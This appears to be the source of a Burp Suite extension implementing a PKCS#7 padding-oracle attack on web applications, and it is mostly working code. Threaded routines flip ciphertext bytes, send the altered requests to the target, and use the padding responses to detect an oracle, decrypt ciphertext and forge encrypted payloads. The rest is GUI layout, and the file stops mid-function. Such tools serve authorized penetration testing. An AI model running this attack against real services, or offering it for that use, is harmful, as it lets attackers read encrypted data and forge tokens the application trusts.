from burp import IBurpExtender, IContextMenuFactory, ITab, IExtensionStateListener, IContextMenuInvocation, IHttpRequestResponse
from javax.swing import (JScrollPane, JPanel, JTabbedPane, JTextField, JLabel, JTextArea, JButton, JEditorPane, JMenuItem, JComboBox, JCheckBox, JOptionPane, JProgressBar, GroupLayout)        
from java.lang import Short
from java.awt import Color
from binascii import hexlify, unhexlify
import re
import threading
import Queue
import random
import base64
import time
from collections import Counter, namedtuple


class BurpExtender(IBurpExtender, IContextMenuFactory, ITab, IExtensionStateListener):
# *************************************** PKCS#7 ***************************************
# global variables           
    gReqResPKCS7 = IHttpRequestResponse
    gSelectedParamNamePKCS7 = ""
    gHttpRequestStringPKCS7 = ""
    gHttpRequestRawStringPKCS7 = ""        
    gPayloadPKCS7=""
    gPayloadFormatPKCS7=""
    gSelectedPayloadPKCS7=None
    gThreadStopPKCS7=False
    gOpThreadPKCS7 = None
    gIsPayloadUrlEncodedPKCS7 = False
    gresDictPKCS7={}
    gPlaintextPKCS7 = ""
    gBlockSizePKCS7 = ""
    gThreadPKCS7 = ""
    gPadMsgPKCS7 = ""
    gPadMsgSelPKCS7 = ""
    


    def DisplayOutput_PKCS7(self, text):
        self.__jTextAreaOutputPKCS7.append(text)

    
    def Worker_PKCS7(self, payloadLen, blockLen, current_block, encrypted_payload, mod_byte, numOfPad, PadMsg, start_byte, end_byte, mode, q):
        
        for byteValue in range(start_byte,end_byte):
            # Exit the operation if stop button was clicked
            if(self.gThreadStopPKCS7):
                return

            # modify the block according to the padding value        
            mod_block = current_block[0:blockLen-(numOfPad*2)] + hex(byteValue).rstrip("L").replace('0x','').rjust(2,'0') + mod_byte            

            if(mode=="test"):
                payload = encrypted_payload.replace(current_block, mod_block)
                # send the web refresh request to check for oracle                                            
                result = self.ServiceRequest_PKCS7(payload)
                ResInfo = self._helpers.analyzeResponse(result)
                response = result[ResInfo.getBodyOffset():]                
                self.gresDictPKCS7[payload] = unhexlify(hexlify(response))                
            else:
                if(mode=="enc"):
                    # dummy block to be appended to the encrypted block so that length is the same as the original payload
                    dummyblock = self.GetDummyBlock_PKCS7(blockLen *((payloadLen//blockLen)-2))

                    # send the web request
                    result = self.ServiceRequest_PKCS7(dummyblock + mod_block + encrypted_payload)                    

                elif(mode=="dec"):
                    # send the web request            
                    result = self.ServiceRequest_PKCS7(encrypted_payload.replace(current_block,mod_block))

                # if the message is an invalid padding message
                if self.gPadMsgSelPKCS7=="Invalid":
                    if (hexlify(PadMsg.encode()) not in hexlify(result)):                    
                        decb4xor = byteValue ^ numOfPad                    
                        q.put(decb4xor)            
                        return
                # if the message is a valid padding message
                else:
                    if (hexlify(PadMsg.encode()) in hexlify(result)):                    
                        decb4xor = byteValue ^ numOfPad                    
                        q.put(decb4xor)            
                        return

                # return if the correct padding is already found
                if(not q.empty()):            
                    return    


    def ServiceRequest_PKCS7(self, encrypted_string):        
        try:
            # Convert the payload back to the original format from hex
            payload = self.ConvertFromHexToPayloadFormat(encrypted_string, self.gPayloadFormatPKCS7, self.gIsPayloadUrlEncodedPKCS7)
            if payload != None:
                # Replace the #PAYLOAD# with the actual payload
                newHttpRequest = self.gHttpRequestStringPKCS7.replace("#PAYLOAD#", payload)            

                # Update the http parameters
                reqInfo = self._helpers.analyzeRequest(newHttpRequest)
                headers = reqInfo.getHeaders()            
                param = newHttpRequest[reqInfo.getBodyOffset():]            
                newHttpRequest = self._helpers.buildHttpMessage(headers, param)

                # Send the request
                httpService = self.gReqResPKCS7.getHttpService()
                res = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(httpService.getHost(),httpService.getPort(), httpService.getProtocol() == "https"), newHttpRequest)                
                return res.getResponse()
        except Exception as e:
            return ""        

    
    def GetDummyBlock_PKCS7(self, length):
        HexChar=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
        DummyBlock=""
        for i in range(0,length):    
            DummyBlock = DummyBlock + HexChar[random.randint(0,15)]
        return DummyBlock


    def Test_PKCS7(self, encrypted_string):
        # initialize the variables
        blockLen = int(self.gBlockSizePKCS7)*2                
        payloadLen = len(encrypted_string)                
        nbOfBlock = payloadLen//blockLen                
        dummyblock = self.GetDummyBlock_PKCS7(blockLen*(nbOfBlock-1))        
        encrypted_payload = dummyblock + encrypted_string[-blockLen:]
        current_block = encrypted_payload[-(blockLen*2):][0:blockLen]        
        self.gresDictPKCS7 = {}

        # limit the number of thread to 256
        numberOfThread = int(self.gThreadPKCS7)
        if(numberOfThread>=256):
            numberOfThread = 256
            
        # check byte from 0 - 255 to find the correct padding value            
        threads = list()
        byte_range = 256//numberOfThread
        byte_remain = 256%numberOfThread 

        # create and execute the threads        
        for k in range(0,numberOfThread):
            start_byte_range = k * byte_range
            end_byte_range = (k+1) * byte_range                    
            x = threading.Thread(target=self.Worker_PKCS7, args=(payloadLen, blockLen, current_block, encrypted_payload, "", 1, "", start_byte_range, end_byte_range, "test", None))
            threads.append(x)
            x.start()

        # left over thread if there is any
        if(byte_remain != 0):
            start_byte_range = (k+1) * byte_range
            end_byte_range = ((k+1) * byte_range) + byte_remain
            x = threading.Thread(target=self.Worker_PKCS7, args=(payloadLen, blockLen, current_block, encrypted_payload, "", 1, "", start_byte_range, end_byte_range, "test", None))
            threads.append(x)
            x.start()

        # wait until all threads are complete
        for x in threads:
            x.join()

        # Exit the operation if stop button was clicked
        if self.gThreadStopPKCS7:
            return

        # check the padding responses
        resCount = Counter(self.gresDictPKCS7.values())
        if len(resCount)==2:
            validPadRes = ""
            invalidPadRes = ""
            for response in resCount:            
                # if there is 1 unique response, it is likely the valid padding response           
                if(resCount[response]==1):                
                    validPadRes = response

                # there should be 255 same reponses for invalid padding
                elif(resCount[response]==255):
                    invalidPadRes = response
            
            # check and print the result
            if(validPadRes!="" and invalidPadRes!=""):
                self.__jTextAreaOutputPKCS7.setForeground(Color(255, 0, 0))
                key_list = list(self.gresDictPKCS7.keys())
                val_list = list(self.gresDictPKCS7.values())

                # Retrive the payload for invalid padding 
                invalidpad_payload = key_list[val_list.index(invalidPadRes)]
                invalidpad_payload = self.ConvertFromHexToPayloadFormat(invalidpad_payload, self.gPayloadFormatPKCS7, self.gIsPayloadUrlEncodedPKCS7)
                
                # Retrive the payload for valid padding 
                validpad_payload = key_list[val_list.index(validPadRes)]
                validpad_payload = self.ConvertFromHexToPayloadFormat(validpad_payload, self.gPayloadFormatPKCS7, self.gIsPayloadUrlEncodedPKCS7)                
                

                # Display the invalid padding response
                self.DisplayOutput_PKCS7("**** Invalid Padding: ****\n")
                self.DisplayOutput_PKCS7("Payload:\n{}\n".format(invalidpad_payload))                
                self.DisplayOutput_PKCS7("Response:\n{}\n\n".format(invalidPadRes))                

                # Display the valid padding response
                self.DisplayOutput_PKCS7("**** Valid Padding: ****\n")
                self.DisplayOutput_PKCS7("Payload:\n{}\n".format(validpad_payload))
                self.DisplayOutput_PKCS7("Response:\n{}\n\n".format(validPadRes))                                    
                
                # Display the conclusion
                self.DisplayOutput_PKCS7("The server is likely vulnerable to padding oracle attack\n")                
            else:
                # Display the conclusion
                self.DisplayOutput_PKCS7("The server is not vulnerable to padding oracle attack\n")                        
        else:
            # Display the conclusion
            self.DisplayOutput_PKCS7("The server is not vulnerable to padding oracle attack\n")

        # set progress bar to complete
        self.__jProgressBarPKCS7.setValue(100)
        self.__jProgressBarPKCS7.setString("Done")
                    


    def Encryption_PKCS7(self):
        # initialize the variables        
        blockLen = int(self.gBlockSizePKCS7) *2        
        plaintextblock = []
        ciphertext=""

        self.DisplayOutput_PKCS7("Encrypting plaintext: {}\n".format(self.gPlaintextPKCS7))        
        
        # limit the number of thread to 256
        numberOfThread = int(self.gThreadPKCS7)
        if(numberOfThread>=256):
            numberOfThread = 256       

        # calculate and compute the padding
        padding_len = (len(self.gPlaintextPKCS7)//2)%int(self.gBlockSizePKCS7)

        if(padding_len==0):
            padding_len=int(self.gBlockSizePKCS7)
        else:
            padding_len = int(self.gBlockSizePKCS7) - padding_len
        
        padding = (hex(padding_len).rstrip("L").replace('0x','').rjust(2,'0'))*padding_len
        msg_hex = self.gPlaintextPKCS7 + padding
        payloadLen = len(msg_hex)      
        
        # store the plaintext as blocks
        for index in range(len(msg_hex),0,-blockLen):
            plaintextblock.append(msg_hex[index-blockLen:index])
        
        # set last encrypted block with random bytes
        last_encrypted_payload = self.GetDummyBlock_PKCS7(blockLen)    
        encrypted_payload =  last_encrypted_payload

        # store the last blocks as ciphertext    
        ciphertext = last_encrypted_payload

        # Start computing the ciphertext
        self.DisplayOutput_PKCS7('Computing Padding Oracle Encryption..\n')
        self.DisplayOutput_PKCS7("Computed Blocks in Hexadecimal:\n")
        self.DisplayOutput_PKCS7("block 1: {}\n".format(encrypted_payload))

        for i in range(0,len(plaintextblock)):            
            decb4xorstring=""                
            mod_byte=""
            current_block = self.GetDummyBlock_PKCS7(blockLen)

            # number of byte for padding
            for numOfPad in range(1,int(self.gBlockSizePKCS7)+1):            
                if(decb4xorstring!=""):             
                    tmp_byte = (hex(numOfPad).rstrip("L").replace('0x','').rjust(2,'0'))*(numOfPad-1)
                    mod_byte = hex(int(tmp_byte,16) ^ int(decb4xorstring,16)).rstrip("L").replace('0x','').rjust((numOfPad-1)*2,'0')

                # check byte from 0 - 255 to find the correct padding value            
                threads = list()
                byte_range = 256//numberOfThread
                byte_remain = 256%numberOfThread
                q = Queue.Queue()

                # create and execute the threads        
                for k in range(0,numberOfThread):
                    start_byte_range = k * byte_range
                    end_byte_range = (k+1) * byte_range
                    x = threading.Thread(target=self.Worker_PKCS7, args=(payloadLen, blockLen, current_block, encrypted_payload, mod_byte, numOfPad, self.gPadMsgPKCS7, start_byte_range, end_byte_range, "enc", q))
                    threads.append(x)
                    x.start()
                
                # left over thread if there is any
                if(byte_remain != 0):
                    start_byte_range = (k+1) * byte_range
                    end_byte_range = ((k+1) * byte_range) + byte_remain
                    x = threading.Thread(target=self.Worker_PKCS7, args=(payloadLen, blockLen, current_block, encrypted_payload, mod_byte, numOfPad, self.gPadMsgPKCS7, start_byte_range, end_byte_range, "enc", q))
                    threads.append(x)
                    x.start()

                # wait until all threads complete
                for x in threads:
                    x.join()                
                
                # Exit the operation if stop button was clicked
                if self.gThreadStopPKCS7:
                    return
                
                # if the valid padding is found
                if(not q.empty()):
                    decb4xor = q.get()                
                    q.task_done()
                    decb4xorstring =  hex(decb4xor).rstrip("L").replace('0x','').rjust(2,'0') + decb4xorstring
                    index = blockLen-(numOfPad*2)
                    ciphertext = hex(decb4xor ^ int(plaintextblock[i][index:index+2],16)).rstrip("L").replace('0x','').rjust(2,'0') + ciphertext                    
                else:
                    self.DisplayOutput_PKCS7("\nUnable to find valid padding!\n")
                    return

            # assigned the current recovered ciphertext to encrypted payload
            encrypted_payload = ciphertext[0:blockLen]            
            self.DisplayOutput_PKCS7("block {}: {}\n".format(i+2,encrypted_payload))

            # update the progress bar                        
            progress = int((i+1)/float(len(plaintextblock))*100)            
            self.__jProgressBarPKCS7.setValue(progress)
        
        # return the encrypted payload into the desired format
        ciphertext = self.ConvertFromHexToPayloadFormat(ciphertext, self.gPayloadFormatPKCS7, self.gIsPayloadUrlEncodedPKCS7)

        if(ciphertext!=None):            
            # set progress bar to complete
            self.__jProgressBarPKCS7.setString("Done")

            # output the encrypted payload
            self.DisplayOutput_PKCS7("\nencrypted payload:\n")
            self.DisplayOutput_PKCS7("{}\n".format(ciphertext))        
        

    def Decryption_PKCS7(self, encrypted_string):
        # initialize the variables        
        blockLen = int(self.gBlockSizePKCS7)*2        
        plaintext=""
        blocktext=""    
        payloadLen = len(encrypted_string)
        nbOfBlock = payloadLen//blockLen
        dummyblock = self.GetDummyBlock_PKCS7(blockLen*(nbOfBlock-1))
        # iv = encrypted_string[0:blockLen]        
        blockCounter=1

        self.DisplayOutput_PKCS7("Decrypting ciphertext: {}\n".format(self.gSelectedPayloadPKCS7))        

        # limit the number of thread to 256
        numberOfThread = int(self.gThreadPKCS7)
        if(numberOfThread>=256):
            numberOfThread = 256   

        # Start decryption
        self.DisplayOutput_PKCS7("Computing Padding Oracle Decryption......\n")
        self.DisplayOutput_PKCS7("Recovered Blocks in Hexadecimal:\n")

        # Split the block (value of n-1 block is required to recover n block)
        for block in range(nbOfBlock-2,-1,-1):
            decb4xorstring=""                    
            mod_byte=""

            # number of byte for padding
            for numOfPad in range(1,int(self.gBlockSizePKCS7)+1):                
                # Extract the current encrypted byte to be recovered
                currentByte = encrypted_string[-(blockCounter*blockLen)-(numOfPad*2):][0:2]

                # Prepare the payload
                encrypted_payload = dummyblock + encrypted_string[(-blockCounter*blockLen):][0:blockLen]

                # Extract the current working block
                current_block = encrypted_payload[(-blockLen*2):][0:blockLen]

                if(decb4xorstring!=""):
                    tmp_byte = (hex(numOfPad).rstrip("L").replace('0x','').rjust(2,'0'))*(numOfPad-1)
                    mod_byte = hex(int(tmp_byte,16) ^ int(decb4xorstring,16)).rstrip("L").replace('0x','').rjust((numOfPad-1)*2,'0')

                # check byte from 0 - 255 to find the correct padding value            
                threads = list()
                byte_range = 256//numberOfThread
                byte_remain = 256%numberOfThread                
                q = Queue.Queue()            

                # create and execute the threads         
                for k in range(0,numberOfThread):
                    start_byte_range = k * byte_range
                    end_byte_range = (k+1) * byte_range
                    x = threading.Thread(target=self.Worker_PKCS7, args=(payloadLen, blockLen, current_block, encrypted_payload, mod_byte, numOfPad, self.gPadMsgPKCS7, start_byte_range, end_byte_range, "dec", q))
                    threads.append(x)
                    x.start()
                
                # left over thread if there is any
                if(byte_remain != 0):
                    start_byte_range = (k+1) * byte_range
                    end_byte_range = ((k+1) * byte_range) + byte_remain
                    x = threading.Thread(target=self.Worker_PKCS7, args=(payloadLen, blockLen, current_block, encrypted_payload, mod_byte, numOfPad, self.gPadMsgPKCS7, start_byte_range, end_byte_range, "dec", q))
                    threads.append(x)
                    x.start()

                # wait until all threads complete                
                for x in threads:
                    x.join()

                # Exit the operation if stop button was clicked
                if self.gThreadStopPKCS7:
                    return                
                
                # if the valid padding is found
                if(not q.empty()):
                    decb4xor = q.get()                
                    q.task_done()
                    decb4xorstring =  hex(decb4xor).rstrip("L").replace('0x','').rjust(2,'0') + decb4xorstring
                    index = blockLen-(numOfPad*2)                    
                    blocktext = hex(decb4xor ^ int(currentByte,16)).rstrip("L").replace('0x','').rjust(2,'0') + blocktext
                    
                else:
                    self.DisplayOutput_PKCS7("\nUnable to find correct padding!\n")                    
                    return
            plaintext = blocktext + plaintext
            self.DisplayOutput_PKCS7("block {}: {}\n".format(blockCounter,blocktext))
            blocktext=""

            # update the progress bar                        
            progress = int((blockCounter/float(nbOfBlock-1))*100)            
            self.__jProgressBarPKCS7.setValue(progress)                    
            blockCounter = blockCounter+1

        # set progress bar to complete
        self.__jProgressBarPKCS7.setString("Done")

        # output the plaintext                
        self.DisplayOutput_PKCS7("\nDecrypted plaintext:\n")
        self.DisplayOutput_PKCS7("Hex: {}\n".format(plaintext))
        self.DisplayOutput_PKCS7("Bytes: {}\n".format(unhexlify(plaintext)))


    def InputValidation_PKCS7(self, mode):
        try:
            # Set default font display to black
            self.__jTextAreaOutputPKCS7.setForeground(Color(0, 0, 0))

            # make sure all the previous thread was terminated
            if self.gOpThreadPKCS7!=None and self.gOpThreadPKCS7.isAlive():
                JOptionPane.showMessageDialog(self._jPaddingOracleTab,"Previous thread is still running! Please click the stop button to terminate it", "Warning", JOptionPane.WARNING_MESSAGE)                
                return False
            
            # reset the variables
            self.gThreadStopPKCS7 = False            
            self.__jTextAreaOutputPKCS7.setText("")
            self.__jProgressBarPKCS7.setValue(0)
            self.__jProgressBarPKCS7.setString("")
            self.__jProgressBarPKCS7.setStringPainted(True)

            # check if the payload is selected
            if self.gSelectedPayloadPKCS7==None:
                JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Incorrect payload selection!", "Error", JOptionPane.ERROR_MESSAGE)
                return False                                    
            
            # Get plaintext for encryption operation
            if mode=="encrypt":
                plaintext_string = re.sub('\W+','', self.__textPlaintextPKCS7.getText())
                if plaintext_string=="":
                    JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide the plaintext in hexadecimal!", "Error", JOptionPane.ERROR_MESSAGE)
                    return False

                # check whether the plaintext is hexadecimal value
                unhexlify(plaintext_string.encode())
                self.gPlaintextPKCS7 = plaintext_string       

            # Get block size
            blocksize = re.sub('\W+','', self.__textBlockSizePKCS7.getText())
            if blocksize=="":
                  JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide a valid block size in byte!", "Error", JOptionPane.ERROR_MESSAGE)
                  return False                       
            self.gBlockSizePKCS7 = blocksize

            # Get number of thread
            thread = re.sub('\W+','',self.__textThreadPKCS7.getText())
            if thread=="":
                  JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide a valid thread number!", "Error", JOptionPane.ERROR_MESSAGE)
                  return False
            self.gThreadPKCS7 = thread

            # Only used in the encryption or decryption operations
            if mode!="test":
                # Get valid or invalid padding message
                self.gPadMsgSelPKCS7 = self.__jComboBoxPadMsgPKCS7.getSelectedItem()
                PadMsg = self.__textPadMessagePKCS7.getText()
                if PadMsg=="":
                    JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide part or full of the valid or invalid padding response!", "Error", JOptionPane.ERROR_MESSAGE)
                    return False
                self.gPadMsgPKCS7 = PadMsg

            return True                
        except Exception as e:
            JOptionPane.showMessageDialog(self._jPaddingOracleTab, e, "Exception", JOptionPane.ERROR_MESSAGE)
            return False

    
    def setGUI_PKCS7(self):
        self.__jPanelPKCS7 = JPanel()
        jPanelLayoutPKCS7 = GroupLayout(self.__jPanelPKCS7)
        self.__jPanelPKCS7.setLayout(jPanelLayoutPKCS7)
        jPanelLayoutPKCS7.setAutoCreateGaps(True)
        jPanelLayoutPKCS7.setAutoCreateContainerGaps(True)       

        self.__jLabelReqPKCS7 = JLabel("Request")        
        self.__jScrollPaneReqPKCS7 = JScrollPane()
        self.__jEditorPaneReqPKCS7 = JEditorPane()
        self.__jEditorPaneReqPKCS7.setEditable(False)                        
        self.__jScrollPaneReqPKCS7.setViewportView(self.__jEditorPaneReqPKCS7)       

        self.__jLabelThreadPKCS7 = JLabel("Thread:")
        self.__textThreadPKCS7 = JTextField("1")
        self.__textThreadPKCS7.setToolTipText("number of thread")        

        self.__jLabelBlockSizePKCS7 = JLabel("Block Size:")        
        self.__textBlockSizePKCS7 = JTextField("16")
        self.__textBlockSizePKCS7.setToolTipText("block size (byte)")        

        self.__jLabelPadMessagePKCS7 = JLabel("Padding Response:")        
        self.__textPadMessagePKCS7 = JTextField()        
        self.__textPadMessagePKCS7.setToolTipText("part or full of the valid or invalid padding response, only used in the encryption and decryption operations")
        self.__jComboBoxPadMsgPKCS7 = JComboBox(['Invalid', 'Valid'])
        self.__jComboBoxPadMsgPKCS7.setSelectedIndex(0)

        self.__jButtonClearPayloadPKCS7 = JButton("Clear Selection",actionPerformed=self.clearPayload_PKCS7)
        self.__jButtonSelPayloadPKCS7 = JButton("Select Payload",actionPerformed=self.selectPayload_PKCS7)
        
        self.__jLabelFormatPKCS7 = JLabel("Format:")
        self.__jComboBoxFormatPKCS7 = JComboBox(['Hex', 'Base64', 'Decimal'])
        self.__jComboBoxFormatPKCS7.setSelectedIndex(0)
        

        self.__jCheckBoxUrlEncodedPKCS7=JCheckBox("Url Encoded")        
        
        self.__jButtonTestPKCS7 = JButton("Test", actionPerformed=self.testPayload_PKCS7)
        self.__jButtonEncPKCS7 = JButton("Encrypt", actionPerformed=self.encryptPayload_PKCS7)
        self.__jButtonDecPKCS7 = JButton("Decrypt", actionPerformed=self.decryptPayload_PKCS7)
        self.__jButtonStopPKCS7 = JButton("Stop", actionPerformed=self.stopOperation_PKCS7)
        
        self.__jLabelOutPKCS7 = JLabel("Output")        
        self.__jTextAreaOutputPKCS7 = JTextArea()
        self.__jTextAreaOutputPKCS7.setEditable(False)
        self.__jTextAreaOutputPKCS7.setColumns(20)
        self.__jTextAreaOutputPKCS7.setRows(5)
        self.__jScrollPaneOutPKCS7 = JScrollPane()
        self.__jScrollPaneOutPKCS7.setViewportView(self.__jTextAreaOutputPKCS7)

        self.__jLabelPlaintextPKCS7 = JLabel("Plaintext:")        
        self.__textPlaintextPKCS7 = JTextField()
        self.__textPlaintextPKCS7.setToolTipText("plaintext in hexadecimal, only use in the encryption operation")

        self.__jProgressBarPKCS7 = JProgressBar()
            
        jPanelLayoutPKCS7.setHorizontalGroup(   
            jPanelLayoutPKCS7.createParallelGroup()
            .addComponent(self.__jLabelReqPKCS7)
            .addComponent(self.__jScrollPaneReqPKCS7, GroupLayout.PREFERRED_SIZE, 0, 1080)
            .addGroup(
                jPanelLayoutPKCS7.createSequentialGroup()
                .addGap(300, 300, 300)                                                  
                .addComponent(self.__jButtonSelPayloadPKCS7)                
                .addGap(20, 20, 20)                 
                .addComponent(self.__jLabelFormatPKCS7)
                .addComponent(self.__jComboBoxFormatPKCS7,GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addGap(20, 20, 20)
                .addComponent(self.__jCheckBoxUrlEncodedPKCS7)
                .addGap(20, 20, 20)                 
                .addComponent(self.__jButtonClearPayloadPKCS7))                
            .addGroup(
                jPanelLayoutPKCS7.createSequentialGroup()
                .addGroup( 
                          jPanelLayoutPKCS7.createParallelGroup()
                          .addComponent(self.__jLabelThreadPKCS7)
                          .addComponent(self.__jLabelBlockSizePKCS7)                
                          .addComponent(self.__jLabelPadMessagePKCS7)
                          .addComponent(self.__jLabelPlaintextPKCS7))
                .addGroup( 
                          jPanelLayoutPKCS7.createParallelGroup()                                   
                          .addComponent(self.__textThreadPKCS7, GroupLayout.PREFERRED_SIZE, 112, GroupLayout.PREFERRED_SIZE)
                          .addComponent(self.__textBlockSizePKCS7, GroupLayout.PREFERRED_SIZE, 112, GroupLayout.PREFERRED_SIZE)
                          .addComponent(self.__textPadMessagePKCS7, GroupLayout.PREFERRED_SIZE, 870, GroupLayout.PREFERRED_SIZE)                          
                          .addComponent(self.__textPlaintextPKCS7, GroupLayout.PREFERRED_SIZE, 870, GroupLayout.PREFERRED_SIZE))
                .addGap(20, 20, 20)  
                .addComponent(self.__jComboBoxPadMsgPKCS7,GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))                
                
            .addComponent(self.__jLabelOutPKCS7)
            .addComponent(self.__jScrollPaneOutPKCS7,GroupLayout.PREFERRED_SIZE, 0, 1080)            
            .addGroup(
                jPanelLayoutPKCS7.createSequentialGroup()
                .addGap(165, 165, 165)
                .addComponent(self.__jButtonTestPKCS7)
                .addGap(165, 165, 165)
                .addComponent(self.__jButtonEncPKCS7)
                .addGap(165, 165, 165)
                .addComponent(self.__jButtonDecPKCS7)
                .addGap(165, 165, 165)
                .addComponent(self.__jButtonStopPKCS7))
            .addComponent(self.__jProgressBarPKCS7, GroupLayout.PREFERRED_SIZE, 1080, GroupLayout.PREFERRED_SIZE)
        )

        jPanelLayoutPKCS7.setVerticalGroup(
            jPanelLayoutPKCS7.createSequentialGroup()
            .addComponent(self.__jLabelReqPKCS7)
            .addComponent(self.__jScrollPaneReqPKCS7, GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
            .addGap(15, 15, 15)            
            .addGroup(
                jPanelLayoutPKCS7.createParallelGroup()
                .addComponent(self.__jButtonSelPayloadPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)                                
                .addComponent(self.__jLabelFormatPKCS7)
                .addComponent(self.__jComboBoxFormatPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jCheckBoxUrlEncodedPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jButtonClearPayloadPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)            
            .addGroup(
                jPanelLayoutPKCS7.createParallelGroup()
                .addComponent(self.__jLabelThreadPKCS7)
                .addComponent(self.__textThreadPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS7.createParallelGroup()
                .addComponent(self.__jLabelBlockSizePKCS7)
                .addComponent(self.__textBlockSizePKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS7.createParallelGroup()
                .addComponent(self.__jLabelPadMessagePKCS7)
                .addComponent(self.__textPadMessagePKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jComboBoxPadMsgPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS7.createParallelGroup()
                .addComponent(self.__jLabelPlaintextPKCS7)
                .addComponent(self.__textPlaintextPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addComponent(self.__jLabelOutPKCS7)
            .addComponent(self.__jScrollPaneOutPKCS7,GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS7.createParallelGroup()
                .addComponent(self.__jButtonTestPKCS7, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE)            
                .addComponent(self.__jButtonEncPKCS7, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE)            
                .addComponent(self.__jButtonDecPKCS7, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jButtonStopPKCS7, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE))
            .addGap(50, 50, 50)
            .addComponent(self.__jProgressBarPKCS7, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
            .addGap(20, 20, 20)            
        )


    def stopOperation_PKCS7(self, button):
        self.DisplayOutput_PKCS7("Operation halted!\n")
        self.gThreadStopPKCS7 = True
        self.__jProgressBarPKCS7.setValue(0)
        self.__jProgressBarPKCS7.setString("")


    def testPayload_PKCS7(self, button):
        # Perform input validation
        initStatus = self.InputValidation_PKCS7("test")
        if(initStatus):                    
            # Start the Test thread
            self.__jProgressBarPKCS7.setString("Testing...")
            encrypted_string = self.gPayloadPKCS7
            self.gOpThreadPKCS7 = threading.Thread(target=self.Test_PKCS7, args=(encrypted_string,))            
            self.gOpThreadPKCS7.start()


    def encryptPayload_PKCS7(self, button):
        # Perform input validation
        initStatus = self.InputValidation_PKCS7("encrypt")
        if(initStatus):            
            # Start the Encryption Thread
            self.__jProgressBarPKCS7.setString("Encrypting...")
            self.gOpThreadPKCS7 = threading.Thread(target=self.Encryption_PKCS7)            
            self.gOpThreadPKCS7.start()                             
         

    def decryptPayload_PKCS7(self, button):
        # Perform input validation
        initStatus = self.InputValidation_PKCS7("decrypt")
        if(initStatus):    
            # Start the Decryption Thread
            self.__jProgressBarPKCS7.setString("Decrypting...")
            encrypted_string = self.gPayloadPKCS7
            self.gOpThreadPKCS7 = threading.Thread(target=self.Decryption_PKCS7, args=(encrypted_string,))            
            self.gOpThreadPKCS7.start()            
        

    def clearPayload_PKCS7(self, button):
        if self.gHttpRequestRawStringPKCS7 !="":
            self.__jEditorPaneReqPKCS7.setText(self.gHttpRequestRawStringPKCS7)
            self.gSelectedPayloadPKCS7 = None

            # Enabled the format dropdown box and url encode checkbox
            self.__jComboBoxFormatPKCS7.setEnabled(True)
            self.__jCheckBoxUrlEncodedPKCS7.setEnabled(True)

        
    def selectPayload_PKCS7(self, button):                
        # Retrieve the selected the payload        
        payload = self.__jEditorPaneReqPKCS7.getSelectedText().replace("\n", "")
        # Stored the selected the payload        
        self.gSelectedPayloadPKCS7 = payload        

        if(payload!=None):
            # Check whether the payload is url encoded.
            if self.__jCheckBoxUrlEncodedPKCS7.isSelected():
                self.gIsPayloadUrlEncodedPKCS7 = True

            try:
                # Get the payload format and convert it to hex
                payload = self.ConverToHexFromPayloadFormat(payload, self.__jComboBoxFormatPKCS7.getSelectedItem(), self.gIsPayloadUrlEncodedPKCS7)

                if(payload!=None):                    
                    # validate whether the payload is hex
                    unhexlify(payload.encode())

                    self.gPayloadPKCS7 = payload
                    self.gPayloadFormatPKCS7 = self.__jComboBoxFormatPKCS7.getSelectedItem()

                    # Replace the selected payload with #PAYLOAD# so that we can process it during the attack
                    self.gHttpRequestStringPKCS7 = self.gHttpRequestRawStringPKCS7.replace(self.gSelectedPayloadPKCS7, "#PAYLOAD#")

                    # Show the selected the payload
                    bytesDisplay = self.gHttpRequestRawStringPKCS7.encode()        
                    insertionPointChar = chr(167)                         
                    bytesDisplay = bytesDisplay.replace(self.gSelectedPayloadPKCS7.encode(), insertionPointChar + self.gSelectedPayloadPKCS7.encode() + insertionPointChar)             
                    self.__jEditorPaneReqPKCS7.setText(bytesDisplay)

                    # Disabled the format dropdown box and url encode checkbox
                    self.__jComboBoxFormatPKCS7.setEnabled(False)
                    self.__jCheckBoxUrlEncodedPKCS7.setEnabled(False)
                 
            except Exception as e:                
